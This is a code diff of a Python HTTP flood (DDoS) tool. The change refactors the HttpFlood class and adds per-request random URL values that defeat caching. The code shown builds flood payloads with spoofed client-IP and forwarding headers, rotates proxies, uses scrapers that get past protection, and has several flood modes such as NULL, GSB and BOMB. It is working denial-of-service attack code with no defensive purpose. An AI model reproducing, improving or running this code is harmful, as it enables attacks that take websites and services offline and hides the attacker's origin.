@@ -19,6 +19,7 @@ from ssl import CERT_NONE, SSLContext, create_default_context
 from subprocess import run
 from sys import argv
 from sys import exit as _exit
+from string import ascii_lowercase
 from threading import Event, Lock, Thread
 from urllib import parse
 from time import sleep, time
@@ -336,14 +337,14 @@ class HttpFlood(Thread):
     _req_type: str
     _useragents: List[str]
     _referers: List[str]
-    _target: URL
+    _url: URL
     _method: str
     _rpc: int
     _synevent: Any
     SENT_FLOOD: Any
 
     def __init__(self,
-                 target: URL,
+                 url: URL,
                  host: str,
                  method: str = "GET",
                  rpc: int = 1,
@@ -356,12 +357,8 @@ class HttpFlood(Thread):
         self._synevent = synevent
         self._rpc = rpc
         self._method = method
-        self._target = target
+        self._raw_url = url
         self._host = host
-        self._raw_target = (self._host, (self._target.port or 80))
-
-        if not self._target.host[len(self._target.host) - 1].isdigit():
-            self._raw_target = (self._host, (self._target.port or 80))
 
         if not referers:
             referers: List[str] = [
@@ -388,7 +385,7 @@ class HttpFlood(Thread):
         self._useragents = list(useragents)
         self._req_type = self.getMethodType(method)
         self._defaultpayload = "%s %s HTTP/1.1\r\n" % (self._req_type,
-                                                       target.raw_path_qs)
+                                                       url.raw_path_qs)
         self._payload = (self._defaultpayload +
                          'Accept-Encoding: gzip, deflate, br\r\n'
                          'Accept-Language: en-US,en;q=0.9\r\n'
@@ -401,6 +398,13 @@ class HttpFlood(Thread):
                          'Sec-Gpc: 1\r\n'
                          'Pragma: no-cache\r\n'
                          'Upgrade-Insecure-Requests: 1\r\n')
+
+    @property
+    def _url(self):
+        url = self._raw_url.human_repr()
+        url = url.replace('{rand_int}', str(randint(0, 500)))
+        url = url.replace('{rand_str}', ''.join(randchoice(ascii_lowercase) for _ in range(randint(5, 15))))
+        return URL(url)
 
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
@@ -415,7 +419,7 @@ class HttpFlood(Thread):
         spoof: str = ProxyTools.Random.rand_ipv4()
         payload: str = ""
         payload += "X-Forwarded-Proto: Http\r\n"
-        payload += f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
+        payload += f"X-Forwarded-Host: {self._url.raw_host}, 1.1.1.1\r\n"
         payload += f"Via: {spoof}\r\n"
         payload += f"Client-IP: {spoof}\r\n"
         payload += f'X-Forwarded-For: {spoof}\r\n'
@@ -424,7 +428,7 @@ class HttpFlood(Thread):
 
     def generate_payload(self, other: str = None) -> bytes:
         payload: str | bytes = self._payload
-        payload += "Host: %s\r\n" % self._target.authority
+        payload += "Host: %s\r\n" % self._url.authority
         payload += self.randHeadercontent
         payload += other if other else ""
         return str.encode(f"{payload}\r\n")
@@ -436,11 +440,11 @@ class HttpFlood(Thread):
             sock = socket()
 
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-        sock.connect(self._raw_target)
+        sock.connect((self._host, (self._raw_url.port or 80)))
 
-        if self._target.scheme.lower() == "https":
+        if self._url.scheme.lower() == "https":
             sock = ctx.wrap_socket(sock,
-                                   server_hostname=self._target.host,
+                                   server_hostname=self._url.host,
                                    server_side=False,
                                    do_handshake_on_connect=True,
                                    suppress_ragged_eofs=True)
@@ -450,7 +454,7 @@ class HttpFlood(Thread):
     def randHeadercontent(self) -> str:
         payload: str = ""
         payload += f"User-Agent: {randchoice(self._useragents)}\r\n"
-        payload += f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n"
+        payload += f"Referrer: {randchoice(self._referers)}{parse.quote(self._url.human_repr())}\r\n"
         payload += self.SpoofIP
         return payload
 
@@ -638,13 +642,13 @@ class HttpFlood(Thread):
             with create_scraper() as s:
                 for _ in range(self._rpc):
                     if pro:
-                        with s.get(self._target.human_repr(),
+                        with s.get(self._url.human_repr(),
                                    proxies=pro.asRequest()) as res:
                             REQUESTS_SENT += 1
                             bytes_sent += Tools.sizeOfRequest(res)
                             continue
 
-                    with s.get(self._target.human_repr()) as res:
+                    with s.get(self._url.human_repr()) as res:
                         REQUESTS_SENT += 1
                         bytes_sent += Tools.sizeOfRequest(res)
         except Exception:
@@ -684,13 +688,13 @@ class HttpFlood(Thread):
                     sleep(min(self._rpc, 5) / 100)
                     if self._proxies:
                         pro = randchoice(self._proxies)
-                        with s.get(self._target.human_repr(),
+                        with s.get(self._url.human_repr(),
                                    proxies=pro.asRequest()) as res:
                             REQUESTS_SENT += 1
                             bytes_sent += Tools.sizeOfRequest(res)
                             continue
 
-                    with s.get(self._target.human_repr()) as res:
+                    with s.get(self._url.human_repr()) as res:
                         REQUESTS_SENT += 1
                         bytes_sent += Tools.sizeOfRequest(res)
             except Exception:
@@ -700,7 +704,7 @@ class HttpFlood(Thread):
         global bytes_sent, REQUESTS_SENT
         payload: str | bytes = self._payload
         payload += "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6),
-                                        self._target.authority)
+                                        self._url.authority)
         payload += self.randHeadercontent
         payload += self.SpoofIP
         payload = str.encode(f"{payload}\r\n")
@@ -722,13 +726,13 @@ class HttpFlood(Thread):
             with Session() as s:
                 for _ in range(self._rpc):
                     if pro:
-                        with s.get(self._target.human_repr(),
+                        with s.get(self._url.human_repr(),
                                    proxies=pro.asRequest()) as res:
                             REQUESTS_SENT += 1
                             bytes_sent += Tools.sizeOfRequest(res)
                             continue
 
-                    with s.get(self._target.human_repr()) as res:
+                    with s.get(self._url.human_repr()) as res:
                         REQUESTS_SENT += 1
                         bytes_sent += Tools.sizeOfRequest(res)
         except Exception:
@@ -737,7 +741,7 @@ class HttpFlood(Thread):
     def GSB(self):
         global bytes_sent, REQUESTS_SENT
         payload = "%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
-                                                self._target.raw_path_qs,
+                                                self._url.raw_path_qs,
                                                 ProxyTools.Random.rand_str(6))
         payload = (payload + 'Accept-Encoding: gzip, deflate, br\r\n'
                    'Accept-Language: en-US,en;q=0.9\r\n'
@@ -750,7 +754,7 @@ class HttpFlood(Thread):
                    'Sec-Gpc: 1\r\n'
                    'Pragma: no-cache\r\n'
                    'Upgrade-Insecure-Requests: 1\r\n')
-        payload += "Host: %s\r\n" % self._target.authority
+        payload += "Host: %s\r\n" % self._url.authority
         payload += self.randHeadercontent
         payload += self.SpoofIP
         payload = str.encode(f"{payload}\r\n")
@@ -766,7 +770,7 @@ class HttpFlood(Thread):
     def NULL(self) -> None:
         global bytes_sent, REQUESTS_SENT
         payload: str | bytes = self._payload
-        payload += "Host: %s\r\n" % self._target.authority
+        payload += "Host: %s\r\n" % self._url.authority
         payload += "User-Agent: null\r\n"
         payload += "Referrer: null\r\n"
         payload += self.SpoofIP
@@ -834,7 +838,7 @@ class HttpFlood(Thread):
             self.SENT_FLOOD = self.PPS
             self._defaultpayload = (
                 self._defaultpayload +
-                "Host: %s\r\n\r\n" % self._target.authority).encode()
+                "Host: %s\r\n\r\n" % self._url.authority).encode()
         if name == "EVEN": self.SENT_FLOOD = self.EVEN
         if name == "BOMB": self.SENT_FLOOD = self.BOMB
 
@@ -849,7 +853,7 @@ class HttpFlood(Thread):
             '--timeout=5s',
             f'--requests={self._rpc}',
             f'--proxy={pro}',
-            f'{self._target.human_repr()}',
+            f'{self._url.human_repr()}',
         ])
 
 
